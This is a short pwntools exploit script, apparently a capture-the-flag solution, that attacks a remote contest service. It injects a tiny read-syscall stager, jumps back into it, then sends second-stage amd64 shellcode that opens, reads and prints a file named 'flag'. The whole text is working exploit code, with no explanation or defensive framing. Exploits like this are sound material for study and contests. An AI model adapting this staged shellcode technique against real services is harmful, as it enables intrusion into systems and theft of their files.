from pwn import *
context.arch='amd64'

#r=process("./pwn")
#gdb.attach(r)
r=remote("contest.ctf.nefu.edu.cn",33072)
pause()
r.recvuntil("Input your name:")
payload1 = asm('''
    xor edi, edi 
    xor edx, edx        
    mov dl, 0xff   
    xor eax ,eax
    syscall
''').ljust(12,b"\x00")


r.send(payload1)
r.recvuntil("Input your shellcode:")
r.send(b"\xEB\xF4")

pay2=asm('''
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push 0x67616c66
    mov rsi,rsp
    xor rdx,rdx
    mov rdi,0xffffff9c
    push 257
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
''')
pause()
r.send(pay2)
r.interactive()


